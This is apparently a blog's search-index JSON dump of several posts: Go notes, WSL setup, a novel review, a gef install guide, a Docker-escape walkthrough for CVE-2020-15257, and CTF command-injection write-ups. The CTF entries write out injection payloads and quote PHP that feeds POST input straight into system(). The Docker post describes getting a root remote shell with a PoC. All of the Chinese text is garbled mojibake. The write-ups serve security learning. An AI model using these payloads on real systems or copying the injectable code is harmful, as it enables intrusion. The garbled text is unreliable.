//æ¥å£çš„ç¬¬äºŒç§ç”¨æ³• var interVal testInter interVal = v1 interVal.fun() } ","date":"2021-04-05","objectID":"/2021-04-05-golang-notes/:2:0","series":null,"tags":["Golang"],"title":"Golang notes","uri":"/2021-04-05-golang-notes/#æµ‹è¯•ä»£ç "},{"categories":["ç¯å¢ƒé…ç½®ç³»åˆ—"],"content":" å‰ææ¡ä»¶ï¼š windows10 å®‰è£…å¥½çš„wsl2ï¼ˆæˆ‘çš„linuxç‰ˆæœ¬æ˜¯ubuntu20.04) vscode ","date":"2021-04-04","objectID":"/2021-04-04-windows10-wsl2-vscode%E9%85%8D%E7%BD%AEgo%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/:0:0","series":null,"tags":["Golang"],"title":"windows10+wsl2+VsCodeé…ç½®goå¼€å‘ç¯å¢ƒ","uri":"/2021-04-04-windows10-wsl2-vscode%E9%85%8D%E7%BD%AEgo%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/#"},{"categories":["ç¯å¢ƒé…ç½®ç³»åˆ—"],"content":"0x00 åœ¨wsl2ä¸­å®‰è£…go å»å®˜ç½‘ä¸‹è½½æœ€æ–°çš„goæ–‡ä»¶åŒ…ï¼Œç„¶åè§£å‹å®‰è£…åˆ°/usr/localç›®å½• $ sudo tar -C /usr/local -xzf go1.16.3.linux-amd64.tar.gz æ·»åŠ ç¯å¢ƒå˜é‡åˆ°~/.profileä¸­ï¼ˆä¸€å¼€å§‹æˆ‘åªæ·»åŠ äº†ç¬¬ä¸€è¡Œçš„PATHå†…å®¹ï¼Œç»“æœåé¢æ‰“å¼€VsCodeä¹‹åæç¤ºå®‰è£…çš„goå·¥å…·å¤±è´¥ï¼Œæ‰€ä»¥åˆåŠ ä¸Šäº†goproxyå†…å®¹ã€‚ export PATH=$PATH:/usr/local/go/bin export GOPROXY=https://goproxy.cn å› ä¸ºæˆ‘æŠŠwslä¸­çš„é»˜è®¤ç»ˆç«¯æ”¹æˆäº†zshï¼Œæ‰€ä»¥éœ€è¦åœ¨.zshrcä¸­æ·»åŠ ä¸Šè¿°ä¸¤è¡Œï¼Œç„¶åæ‰§è¡Œsource .zshrcã€‚å¦‚æœæ˜¯å†™åœ¨.profileä¸­çš„è¯ï¼Œæ¯æ¬¡æ‰“å¼€ç»ˆç«¯å¹¶ä¸ä¼šåŠ è½½å…¶ä¸­çš„å†…å®¹ã€‚ ","date":"2021-04-04","objectID":"/2021-04-04-windows10-wsl2-vscode%E9%85%8D%E7%BD%AEgo%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/:1:0","series":null,"tags":["Golang"],"title":"windows10+wsl2+VsCodeé…ç½®goå¼€å‘ç¯å¢ƒ","uri":"/2021-04-04-windows10-wsl2-vscode%E9%85%8D%E7%BD%AEgo%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/#0x00-åœ¨wsl2ä¸­å®‰è£…go"},{"categories":["ç¯å¢ƒé…ç½®ç³»åˆ—"],"content":"0x01 åˆ›å»ºé¡¹ç›®æ–‡ä»¶å¤¹ éšä¾¿åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”åœ¨å…¶ä¸­åˆ›å»ºä¸€ä¸ªgoæ–‡ä»¶ã€‚ ","date":"2021-04-04","objectID":"/2021-04-04-windows10-wsl2-vscode%E9%85%8D%E7%BD%AEgo%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/:2:0","series":null,"tags":["Golang"],"title":"windows10+wsl2+VsCodeé…ç½®goå¼€å‘ç¯å¢ƒ","uri":"/2021-04-04-windows10-wsl2-vscode%E9%85%8D%E7%BD%AEgo%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/#0x01-åˆ›å»ºé¡¹ç›®æ–‡ä»¶å¤¹"},{"categories":["ç¯å¢ƒé…ç½®ç³»åˆ—"],"content":"0x02 VsCodeé…ç½® é¦–å…ˆç»™VsCodeå®‰è£…wslæ’ä»¶ï¼Œç„¶åç”¨VsCodeæ‰“å¼€åˆšæ‰åˆ›å»ºçš„æ–‡ä»¶å¤¹ï¼Œç‚¹å‡»æ‰“å¼€goæ–‡ä»¶ï¼Œç„¶åä¼šè·³å‡ºå®‰è£…goæ’ä»¶å’Œç›¸å…³å·¥å…·çš„æç¤ºã€‚ æ­£å¸¸æ¥è¯´å·¥å…·å®‰è£…ä¼šå‡ºé—®é¢˜ï¼Œä½†æ˜¯åœ¨å†™å…¥äº†GOPROXYä¹‹åå°±å¯ä»¥è§£å†³ã€‚è™½ç„¶æˆ‘ä¹‹å‰åœ¨windowsä¸Šä¹Ÿå°è¯•è¿‡äº†è¯¸å¤šæ–¹æ³•æ¥è§£å†³è¿™ä¸€é—®é¢˜ï¼Œä½†æ˜¯æ„Ÿè§‰å§‹ç»ˆæ²¡æœ‰é¡ºåˆ©è§£å†³ï¼Œè¿™æ¬¡åœ¨wslä¸­ç«Ÿå¦‚æ­¤é¡ºåˆ©ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯ç³»ç»Ÿçš„åŸå› ã€‚ go/binç›®å½•\" go/binç›®å½• Anyway, å®‰è£…å¥½è¿™äº›å·¥å…·ä¹‹åï¼Œå°±å¯ä»¥å¼€å§‹å¼€å‘äº† :-)ã€‚ ","date":"2021-04-04","objectID":"/2021-04-04-windows10-wsl2-vscode%E9%85%8D%E7%BD%AEgo%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/:3:0","series":null,"tags":["Golang"],"title":"windows10+wsl2+VsCodeé…ç½®goå¼€å‘ç¯å¢ƒ","uri":"/2021-04-04-windows10-wsl2-vscode%E9%85%8D%E7%BD%AEgo%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/#0x02-vscodeé…ç½®"},{"categories":["é˜…è¯»"],"content":"ç¬¬ä¸€æ¬¡è¯»ã€Šç™½å¤œè¡Œã€‹åº”è¯¥æ˜¯åœ¨é«˜ä¸€çš„æ—¶å€™ï¼Œå½“æ—¶åŒå­¦ä»¬æ‰‹ä¸­æœ‰ä¸€æœ¬ï¼Œæ‰€ä»¥å°±å€Ÿæ¥çœ‹è¿‡ã€‚å‡ å¹´è¿‡å»äº†ï¼Œæˆ‘å¯¹äºä¹¦ä¸­çš„å†…å®¹æ—©å·²è®°ä¸å¤ªæ¸…ï¼Œåªè®°å¾—å¤§æ¦‚æ˜¯ä¸ªæ‚²æƒ¨çš„å‡¶æ‰‹çš„æ•…äº‹ã€‚ä»Šå¹´å¯’å‡åœ¨å®¶çš„æ—¶å€™å’Œåˆ«äººèŠåˆ°äº†ä¸œé‡åœ­å¾ï¼Œäºæ˜¯åˆä»ç½‘ä¸Šä¸‹è½½äº†ã€Šç™½å¤œè¡Œã€‹çš„mobiæ–‡ä»¶ï¼Œé‡æ–°å¼€å§‹äº†é˜…è¯»ã€‚ ç¬¬äºŒéçš„é˜…è¯»åº”è¯¥æ˜¯æ¯”ç¬¬ä¸€éè¯»å¾—æ›´åŠ é¡ºåˆ©ã€è®°å¿†æ›´åŠ æ·±åˆ»çš„ï¼ˆä»æˆ‘ç°åœ¨è¿˜èƒ½è®°èµ·ä¹¦ä¸­çš„ä¸»è¦æ•…äº‹æƒ…èŠ‚å°±èƒ½çŸ¥é“ï¼‰ã€‚æ¯«æ— ç–‘é—®ï¼Œè¿™æ˜¯ä¸€ä¸ªä»¤äººæ‚²ä¼¤çš„æ•…äº‹ã€‚ä¹¦ä¸­çš„ä¸¤ä¸ªä¸»äººå…¬ï¼Œå”æ³½é›ªç©—ä¸æ¡åŸäº®å¸ï¼Œéƒ½æ˜¯éå¸¸æ‚²å‰§æ€§çš„äººç‰©ã€‚ç«¥å¹´æ—¶ä»£é­é‡çš„è‹¦éš¾å’Œæ‰“å‡»ï¼Œä½¿å¾—ä»–ä»¬å°±åƒå…‰ä¸æš—ä¸€èˆ¬ï¼Œäº’ç›¸ä¾é ï¼Œäº’ç›¸å¸®åŠ©ï¼Œé€šè¿‡è‡ªå·±å¯¹è¿™ä¸ªä¸–ç•Œçš„æ®‹å¿æ‰‹æ®µæ¥åŠªåŠ›æ´»ç€ã€‚ä¹¦ä¸­çš„è­¦å¯Ÿç¬¹å£æ¶¦ä¸‰ï¼ˆç¬¹ï¼štÃ¬ï¼‰å°†ä»–ä»¬å½¢å®¹ä¸ºæªè™¾ä¸è™¾è™é±¼ä¸¤ç§åŠ¨ç‰©ï¼Œäº’ç›¸å¸®åŠ©ï¼Œç”Ÿå­˜åœ¨å¼±è‚‰å¼ºé£Ÿçš„è‡ªç„¶ç•Œã€‚ è™½ç„¶çŠ¯ç½ªæ˜¯å› ä¸ºå°æ—¶å€™çš„è‹¦éš¾ï¼Œä½†çŠ¯ç½ªç»ˆç©¶æ˜¯çŠ¯ç½ªã€‚æ‰€ä»¥ï¼Œä¸œé‡åœ­å¾åœ¨ä¹¦ä¸­ä¹Ÿäº¤ä»£äº†è±¡å¾æ€§çš„æ­£ä¹‰è·èƒœçš„ç»“å±€ï¼Œæ´»åœ¨æš—å¤„çš„æ¡åŸäº®å¸åœ¨ä¹¦ä¸­çš„è­¦å¯Ÿçš„è¿½æ•ä¸‹é€‰æ‹©äº†ç•ç½ªè‡ªæ€ï¼Œä»¥è‡ªå·±çš„ç”Ÿå‘½æ¢å–é›ªç©—çš„å¹³å®‰æ— äº‹ã€‚ä»–æŠŠä¸€åˆ‡ç½ªæ¶ä¸é»‘æš—éƒ½å¸¦åœ¨è‡ªå·±èº«ä¸Šï¼Œç„¶åç»“æŸäºä»é«˜æ¥¼çš„çºµèº«ä¸€è·ƒä¸­ã€‚äº®å¸åº”è¯¥æ˜¯å–œæ¬¢é›ªç©—çš„ï¼Œæˆ–è®¸ä»–ä»¬å°æ—¶å€™åªæ˜¯å•çº¯çš„å¥½å‹å…³ç³»ï¼Œä½†æ˜¯åœ¨ä¸€äº›äº‹æƒ…å‘ç”Ÿä¹‹åï¼Œä»–å’Œé›ªç©—çš„å¿ƒæ€éƒ½å‘ç”Ÿäº†å·¨å¤§å˜åŒ–ï¼Œå› æ­¤ä»–èƒ½å¤Ÿå¿ƒç”˜æƒ…æ„¿åœ°ä¸ºé›ªç©—ä»˜å‡ºã€‚å½“ç„¶ï¼Œé›ªç©—ä¹Ÿä¸æ˜¯ä»€ä¹ˆå•çº¯å¼±å°çš„å—å®³è€…ï¼Œå¥¹åœ¨ä¹¦ä¸­æ˜¯ä¸€ä¸ªå¤–è¡¨å…‰é²œäº®ä¸½çš„å¥³äººï¼Œå¥¹æ‡‚å¾—åˆ©ç”¨è‡ªå·±çš„è¿™æ–¹é¢ä¼˜åŠ¿æ¥è°‹å–åˆ©ç›Šã€‚è€Œä¸”æˆ‘è§‰å¾—ï¼Œå¯èƒ½æ˜¯é›ªç©—ä¸»åŠ¨æ‰¾äº®å¸åˆä½œçš„ï¼Œå„ç§å¤§æ–¹å‘ä¸Šçš„å†³å®šä¹Ÿæ˜¯å¥¹å®Œæˆçš„ã€‚è¿™æ ·çš„ä¸€ä¸ªå¥³äººå¦‚æœåœ¨ç°å®ä¸–ç•Œä¸­å­˜åœ¨çš„è¯ï¼Œé‚£è‚¯å®šéå¸¸ä»¤äººå¯æ€•ã€‚ ä¸€å¤©å½“ä¸­ï¼Œæœ‰å¤ªé˜³å‡èµ·çš„æ—¶å€™ï¼Œä¹Ÿæœ‰ä¸‹æ²‰çš„æ—¶å€™ã€‚äººç”Ÿä¹Ÿä¸€æ ·ï¼Œæœ‰ç™½å¤©å’Œé»‘å¤œï¼Œåªæ˜¯ä¸ä¼šåƒçœŸæ­£çš„å¤ªé˜³é‚£æ ·ï¼Œæœ‰å®šæ—¶çš„æ—¥å‡ºå’Œæ—¥è½ã€‚çœ‹ä¸ªäººï¼Œæœ‰äº›äººä¸€è¾ˆå­éƒ½æ´»åœ¨å¤ªé˜³çš„ç…§è€€ä¸‹ï¼Œä¹Ÿæœ‰äº›äººä¸å¾—ä¸ä¸€ç›´æ´»åœ¨æ¼†é»‘çš„æ·±å¤œé‡Œã€‚äººå®³æ€•çš„ï¼Œå°±æ˜¯æœ¬æ¥ä¸€ç›´å­˜åœ¨çš„å¤ªé˜³è½ä¸‹ä¸å†å‡èµ·ï¼Œä¹Ÿå°±æ˜¯éå¸¸å®³æ€•åŸæœ¬ç…§åœ¨èº«ä¸Šçš„å…‰èŠ’æ¶ˆå¤±ã€‚ æˆ‘çš„å¤©ç©ºé‡Œæ²¡æœ‰å¤ªé˜³ï¼Œæ€»æ˜¯é»‘å¤œï¼Œä½†å¹¶ä¸æš—ï¼Œå› ä¸ºæœ‰ä¸œè¥¿ä»£æ›¿äº†å¤ªé˜³ã€‚è™½ç„¶æ²¡æœ‰å¤ªé˜³é‚£ä¹ˆæ˜äº®ï¼Œä½†å¯¹æˆ‘æ¥è¯´å·²ç»è¶³å¤Ÿã€‚å‡­å€Ÿç€è¿™ä»½å…‰ï¼Œæˆ‘ä¾¿èƒ½æŠŠé»‘å¤œå½“æˆç™½å¤©ã€‚ä½ æ˜ç™½å—ï¼Ÿæˆ‘ä»æ¥å°±æ²¡æœ‰å¤ªé˜³ï¼Œæ‰€ä»¥ä¸æ€•å¤±å»ã€‚ è¿™æ˜¯ä¹¦ä¸­é›ªç©—å¯¹è‡ªå·±çš„åº—å‘˜è¯´çš„ä¸€å¥è¯ï¼ˆå¦‚æœæˆ‘æ²¡è®°é”™çš„è¯ï¼‰ï¼Œå¬èµ·æ¥æœ‰ç§æ‚²æ‚¯è€Œåˆä»¤äººç”Ÿç•çš„æ„Ÿè§‰ã€‚ä¹Ÿæ­£æ˜¯å› ä¸ºå¥¹ä»æ¥å°±ä¸è§‰å¾—è‡ªå·±æ‹¥æœ‰å¤ªé˜³ï¼Œæ‰€ä»¥å¥¹èƒ½å¤Ÿä¸é¡¾ä¸€åˆ‡åœ°å»è¾¾åˆ°è‡ªå·±çš„ç›®çš„ã€‚ ä¹¦çš„å°é¢å›¾æ¡ˆæ˜¯ä¸€å¼ å‰ªçº¸ï¼Œå‰ªçº¸çš„æ¨¡æ ·æ˜¯ä¸€ä¸ªå°ç”·å­©ä¸å°å¥³å­©ç‰µæ‰‹çš„æ ·å­ï¼Œä¹Ÿå°±æ˜¯äº®å¸ä¸é›ªç©—å°æ—¶å€™çš„åœºæ™¯ã€‚è¯»å®Œæ•´æœ¬ä¹¦å†çœ‹åˆ°è¿™ä¸€å°é¢çš„æ—¶å€™ï¼Œç¡®å®æœ‰ç§æ„å‘³æ·±é•¿çš„æ„Ÿè§‰å•Šã€‚ä¹¦ä¸­ä¸€åˆ‡æ¶çš„æ¥æºï¼Œå°±æ˜¯å¤§äººå¯¹å°å­©çŠ¯ä¸‹çš„ç½ªæ¶ã€‚åœ¨ç½ªæ¶ä¸é»‘æš—çš„ç¯å¢ƒä¸­æˆé•¿çš„äººï¼Œä¹Ÿè®¸çœŸçš„æ³¨å®šäº†ä¸€ç”Ÿéƒ½æ— æ³•æ‹¥æœ‰ç¾å¥½çš„å¤ªé˜³ã€‚ç™½å¤œä¹‹è¡Œï¼Œä»¤äººæƒ‹æƒœã€‚ ç™½å¤œè¡Œcover \" ç™½å¤œè¡Œ ","date":"2021-03-17","objectID":"/2021-03-17-%E9%87%8D%E8%AF%BB%E7%99%BD%E5%A4%9C%E8%A1%8C/:0:0","series":null,"tags":["Life","Reading"],"title":"é‡è¯»ç™½å¤œè¡Œ","uri":"/2021-03-17-%E9%87%8D%E8%AF%BB%E7%99%BD%E5%A4%9C%E8%A1%8C/#"},{"categories":["å·¥å…·é…ç½®"],"content":" å¯¹äºé…ç½®å®Œå…¨ä¸”å¥½ç”¨çš„å·¥å…·ï¼ŒçœŸæ˜¯æ²¡æœ‰æŠµæŠ—åŠ›ã€‚ã€‚ã€‚ ","date":"2021-03-15","objectID":"/2021-03-15-%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%8Bwsl2-ubuntu20%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8Agef%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/:0:0","series":null,"tags":["Linux","WSL"],"title":"wsl2-ubuntu20å®‰è£…ä»¥åŠgefè°ƒè¯•å·¥å…·å®‰è£…","uri":"/2021-03-15-%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%8Bwsl2-ubuntu20%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8Agef%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/#"},{"categories":["å·¥å…·é…ç½®"],"content":"Letâ€™s start exploiting! é¦–å…ˆï¼Œå¼€å¯ä½ çš„windowsç³»ç»Ÿä¸­çš„wslã€‚æ‰“å¼€windowsåŠŸèƒ½ï¼Œå‹¾é€‰ä»¥ä¸‹ä¸¤é¡¹ image-20210315202713474image-20210315202713474 \" image-20210315202713474 Powershellè¾“å…¥wsl -l -væŸ¥çœ‹wslç‰ˆæœ¬ï¼Œå¦‚æœæ˜¯1çš„è¯è¿˜éœ€è¦å‡çº§åˆ°2ã€‚æŒ‰ç…§å¾®è½¯çš„æ–‡æ¡£ï¼Œä¸‹è½½å‡çº§ç¨‹åºå¹¶ç‚¹å‡»å®‰è£…å³å¯ æ¥ä¸‹æ¥é€‰æ‹©ubuntu20ä½œä¸ºå¾…å®‰è£…çš„Linuxç‰ˆæœ¬ï¼Œåœ¨Microsoft Storeä¸­æœç´¢å¹¶å®‰è£…å³å¯ åˆå§‹åŒ–ubuntuå¹¶ä¸”è®¾ç½®ç”¨æˆ·åå¯†ç  æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ›´æ–°æº $ sudo apt update $ sudo apt upgrade å®‰è£…gdb $ sudo apt install gdb å®‰è£…gefï¼Œè¿™é‡Œæˆ‘å°è¯•curlï¼Œwgetéƒ½ä¸è¡Œï¼Œä¼šå¡ä½ï¼Œä½†æ˜¯æ˜æ˜ç½‘ç«™æ˜¯å¯ä»¥è®¿é—®çš„ï¼Œæ²¡åŠæ³•åªè¦å¤åˆ¶ç½‘ç«™å†…å®¹ç„¶åç²˜è´´åˆ°è‡ªå·±åˆ›å»ºçš„.gdbinit-gef.pyæ–‡ä»¶ä¸­ï¼Œç„¶åsourceå†™å…¥ã€‚ä»¥ä¸‹æ˜¯å®˜æ–¹ç»™å‡ºçš„å‡ ç§å®‰è£…æ–¹å¼ # via the install script ## using curl $ bash -c \"$(curl -fsSL http://gef.blah.cat/sh)\" ## using wget $ bash -c \"$(wget http://gef.blah.cat/sh -O -)\" # or manually $ wget -O ~/.gdbinit-gef.py -q http://gef.blah.cat/py $ echo source ~/.gdbinit-gef.py \u003e\u003e ~/.gdbinit # or alternatively from inside gdb directly $ gdb -q (gdb) pi import urllib.request as u, tempfile as t; g=t.NamedTemporaryFile(suffix='-gef.py'); open(g.name, 'wb+').write(u.urlopen('https://tinyurl.com/gef-master').read()); gdb.execute('source %s' % g.name) å¦‚æœä¸€åˆ‡æ— è¯¯çš„è¯ï¼Œå¯åŠ¨gdbï¼Œä½ ä¼šçœ‹åˆ°ä»¥ä¸‹å†…å®¹: image-20210315203732185image-20210315203732185 \" image-20210315203732185 æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶çœ‹çœ‹ï¼Œbeautiful and elegant image-20210315204035474image-20210315204035474 \" image-20210315204035474 ","date":"2021-03-15","objectID":"/2021-03-15-%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%8Bwsl2-ubuntu20%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8Agef%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/:0:1","series":null,"tags":["Linux","WSL"],"title":"wsl2-ubuntu20å®‰è£…ä»¥åŠgefè°ƒè¯•å·¥å…·å®‰è£…","uri":"/2021-03-15-%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%8Bwsl2-ubuntu20%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8Agef%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/#lets-start-exploiting"},{"categories":["å®è·µè®°å½•"],"content":" ç¯å¢ƒä¿¡æ¯ï¼š leo@leo-ubuntu1604:~$ uname -a Linux leo-ubuntu1604 4.15.0-112-generic #113~16.04.1-Ubuntu SMP Fri Jul 10 04:37:08 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux leo@leo-ubuntu1604:~$ lsb_release -a No LSB modules are available. Distributor ID: Ubuntu Description: Ubuntu 16.04.7 LTS Release: 16.04 Codename: xenial Docker: 19.03.8 Containerd: 1.3.7 Poc: https://github.com/cdk-team/CDK/releases/download/v0.1.10/cdk_linux_amd64 ","date":"2021-03-04","objectID":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/:0:0","series":null,"tags":["Linux","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—5 CVE-2020-15257 containerdæ¼æ´é€ƒé€¸","uri":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/#"},{"categories":["å®è·µè®°å½•"],"content":"0x00 å®‰è£…dockerä»¥åŠcontainerd å®‰è£…aptçš„ç›¸å…³ä¾èµ–åŒ… sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common æ·»åŠ Dockerçš„GPGå¯†é’¥ï¼Œæ›´æ–°æº curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add - sudo apt-get update å®‰è£…æŒ‡å®šç‰ˆæœ¬çš„docker sudo apt-get install docker-ce=5:19.03.8~3-0~ubuntu-xenial å®‰è£…æŒ‡å®šç‰ˆæœ¬çš„containerd sudo apt install containerd.io=1.3.7-1 æŸ¥çœ‹dockerä»¥åŠcontainerdç‰ˆæœ¬ä¿¡æ¯ image-20210304163353618image-20210304163353618 \" image-20210304163353618 ","date":"2021-03-04","objectID":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/:0:1","series":null,"tags":["Linux","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—5 CVE-2020-15257 containerdæ¼æ´é€ƒé€¸","uri":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/#0x00-å®‰è£…dockerä»¥åŠcontainerd"},{"categories":["å®è·µè®°å½•"],"content":"0x01 åˆ›å»ºå®¹å™¨ è¿è¡Œä¸€ä¸ªå®¹å™¨å¹¶ä¸”åœ¨å…¶ä¸­ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„poc sudo docker run -it --net=host ubuntu:18.04 /bin/bash # æ³¨æ„å› ä¸º --net=hostå‚æ•°ï¼Œåˆ›å»ºçš„å®¹å™¨çš„ä¸»æœºåå°†æ˜¯å®¿ä¸»æœºåç§°ï¼Œè€Œä¸æ˜¯ä¸€æ®µå“ˆå¸Œå€¼ sudo docker cp /home/leo/Downloads/cdk_linux_amd64 3579:/home/tmpPoc ","date":"2021-03-04","objectID":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/:0:2","series":null,"tags":["Linux","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—5 CVE-2020-15257 containerdæ¼æ´é€ƒé€¸","uri":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/#0x01-åˆ›å»ºå®¹å™¨"},{"categories":["å®è·µè®°å½•"],"content":"0x02 ä¸‹è½½Pocæ‰§è¡Œæ”»å‡» è¿›å…¥åˆ°å®¹å™¨åä½¿ç”¨cdkå·¥å…·äº§ç”Ÿè¿œç¨‹shellã€‚ image-20210304164159822image-20210304164159822 \" image-20210304164159822 è¿œç¨‹ä¸»æœºç›‘å¬åˆ°shellï¼Œå¹¶ä¸”å…·æœ‰rootæƒé™ã€‚ image-20210304164122514image-20210304164122514 \" image-20210304164122514 ","date":"2021-03-04","objectID":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/:0:3","series":null,"tags":["Linux","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—5 CVE-2020-15257 containerdæ¼æ´é€ƒé€¸","uri":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/#0x02-ä¸‹è½½pocæ‰§è¡Œæ”»å‡»"},{"categories":["å®è·µè®°å½•"],"content":"å‚è€ƒé“¾æ¥ï¼š https://xz.aliyun.com/t/8925#toc-0 https://www.freebuf.com/vuls/261962.html ","date":"2021-03-04","objectID":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/:0:4","series":null,"tags":["Linux","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—5 CVE-2020-15257 containerdæ¼æ´é€ƒé€¸","uri":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/#å‚è€ƒé“¾æ¥"},{"categories":["CTF"],"content":"0x08 [GXYCTF2019]Ping Ping Ping é¢˜ç›®é“¾æ¥ ç›¸å…³çŸ¥è¯†ç‚¹ï¼š Linuxå‘½ä»¤æ‰§è¡Œæ³¨å…¥ $IFS$9ç»•è¿‡ç©ºæ ¼è¿‡æ»¤ è¾“å…¥?ip=127.0.0.1;cat$IFS$9index.phpæŸ¥çœ‹index.phpå†…å®¹ã€‚image-20210302171046322image-20210302171046322 \" image-20210302171046322 ä½¿ç”¨$IFS$9ç»•è¿‡ç©ºæ ¼ï¼Œè¾“å…¥ä»¥ä¸‹å†…å®¹ï¼Œå°†lsçš„ç»“æœä½œä¸ºcatå‘½ä»¤çš„å‚æ•°ï¼ŒæŸ¥çœ‹flag.phpå’Œindex.phpå†…å®¹ã€‚ ?ip=127.0.0.1;cat$IFS$9`ls` æ³¨æ„ç½‘é¡µä¸Šæ²¡æœ‰ç›´æ¥æ˜¾ç¤ºflagï¼Œflagè—åœ¨æ³¨é‡Šé‡Œã€‚ image-20210303102314755image-20210303102314755 \" image-20210303102314755 å‚è€ƒé“¾æ¥ï¼š https://ctf.ieki.xyz/buuoj/gxyctf-2019.html https://www.cnblogs.com/eshizhan/archive/2011/11/30/2269325.html ","date":"2021-03-02","objectID":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/:1:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 2","uri":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/#0x08-gxyctf2019ping-ping-ping"},{"categories":["CTF"],"content":"0x09 [ACTF2020 æ–°ç”Ÿèµ›]Exec é¢˜ç›®é“¾æ¥ åŒæ ·æ˜¯å‘½ä»¤æ³¨å…¥ è¿™é¢˜æ›´åŠ ç®€å•ã€‚é¦–å…ˆè¾“å…¥127.0.0.1;lsçœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆæ–‡ä»¶ã€‚ pingping \" ping ç„¶åæŸ¥çœ‹index.phpæ–‡ä»¶å†…å®¹ã€‚å› ä¸ºå¦‚æœç›´æ¥cat index.phpçš„è¯ï¼Œä¼šè¢«æµè§ˆå™¨è§£é‡Šå¹¶æ‰§è¡Œï¼Œæ‰€ä»¥æ— æ³•çœ‹åˆ°æ–‡ä»¶åŸæœ¬çš„å†…å®¹ã€‚äºæ˜¯ï¼Œå¯ä»¥åœ¨å¤–é¢åŒ…ä¸Šä¸€å±‚htmlæ³¨é‡Šã€‚ 127.0.0.1;echo '\u003c!--'`cat index.php`'--\u003e' æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå¯ä»¥è·å¾—index.phpæ–‡ä»¶çš„å†…å®¹ã€‚ \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\" /\u003e \u003ctitle\u003ecommand execution\u003c/title\u003e \u003clink href=\"http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css\" rel=\"stylesheet\" /\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003ePING\u003c/h1\u003e \u003cform class=\"form-inline\" method=\"post\"\u003e \u003cdiv class=\"input-group\"\u003e \u003cinput style=\"width: 280px\" id=\"target\" type=\"text\" class=\"form-control\" placeholder=\"è¯·è¾“å…¥éœ€è¦pingçš„åœ°å€\" aria-describedby=\"basic-addon1\" name=\"target\" /\u003e \u003c/div\u003e \u003cbr /\u003e \u003cbr /\u003e \u003cbutton style=\"width: 280px\" class=\"btn btn-default\"\u003ePING\u003c/button\u003e \u003c/form\u003e \u003cbr /\u003e \u003cpre\u003e \u003c?php if (isset($_POST['target'])) { system(\"ping -c 3 \" . $_POST['target']); } ?\u003e\u003c/pre\u003e \u003c/body\u003e \u003c/html\u003e 